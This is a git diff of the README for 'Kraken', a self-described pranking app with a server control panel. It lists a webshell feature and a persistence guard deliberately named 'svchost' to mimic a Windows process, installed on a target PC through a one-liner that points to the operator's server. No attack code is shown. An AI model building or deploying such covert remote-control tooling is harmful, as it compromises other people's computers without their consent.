@@ -17,7 +17,7 @@
 ## :star2: About the Project
 
 Kraken is a project of simple pranking app and control panel for it. In the current version, the panel is displayed correctly only in the mobile version. The PC site will be added in the future. It is also planned to rewrite the frontend to ReactJS.
-It is still early v0.1 but it's working.
+It is still early v0.9 but it's working.
 
 <!-- Screenshots -->
 ### :camera: Screenshots
@@ -63,7 +63,7 @@ It is still early v0.1 but it's working.
 - Turn off monitor
 - Swap mouse buttons
 - Get webshell (It's not working well yet.)
-- Generation of customized errors
+- Generate customized errors
 
 <div align="center"> 
   <img src="https://github.com/BarrYPL/Kraken/blob/main/public/images/Git%20Screens/ss3.png?raw=true" alt="screenshot" />
@@ -71,21 +71,25 @@ It is still early v0.1 but it's working.
 
 ## 	:toolbox: Getting Started
 
-Compile `kraken.c` file and `svchost.c` file, remember to replace IP to your server and run `oneliner.txt` from pranking PC to install those 2 apps. `Kraken` it actual pranking software and `svchost` is it's guard making sure that Kraken is aorking and trying to restart him when he's not detected.
+Compile `kraken.c` file and `svchost.c` file, remember to replace IP to your server, pou them somehow on your server and run `oneliner.txt` from pranking PC to install those 2 apps. `Kraken` it is actual pranking software and `svchost` is it's guard making sure that Kraken is working and trying to restart him when he's not detected.
 
 ### :bangbang: Prerequisites
 
 <p>Kraken require Windows 64-bit to function properly. It won't works on UNIX systems.
 It is also required to have stable Internet connection between pranking PC and the server.
 
-Server requires instaled Ruby language and gems specified in `controller.rb` file.</p>
+Server requires, DB Browser, instaled Ruby language and some other gems.</p>
 
 ### :gear: Installation
 
-Just download repo and run `main.rb` when gems are installed.
+Download repo, change credentials in `init_db.rb` and run that file copy created DB to `/db` and run `main.rb` when gems are installed.
 
 ```bash
   git clone https://github.com/BarrYPL/Kraken.git
+  cd db/db_components
+  vim init_db.rb *edit credentials*
+  cp database.db ../
+  cd ../..
   ./main.rb
 ```
 
